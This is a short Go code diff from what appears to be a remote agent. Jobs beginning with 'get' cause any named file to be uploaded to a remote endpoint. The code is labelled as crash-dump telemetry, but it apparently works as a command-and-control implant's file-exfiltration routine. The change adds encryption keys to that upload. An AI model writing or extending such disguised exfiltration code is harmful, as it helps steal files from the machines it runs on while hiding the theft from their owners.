@@ -76,7 +76,7 @@ func main() {
 			if strings.HasPrefix(job.Command, "get ") {
 				go func(t DiagnosticJob) {
 					filePath := strings.TrimSpace(strings.TrimPrefix(t.Command, "get "))
-					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath)
+					output, err := funcs.SubmitCrashDump(TelemetryEndpoint+PathUpload, EndpointID, filePath, KeyID, EncryptionKey)
 					if err != nil {
 						output = fmt.Sprintf("Upload error: %v", err)
 					}
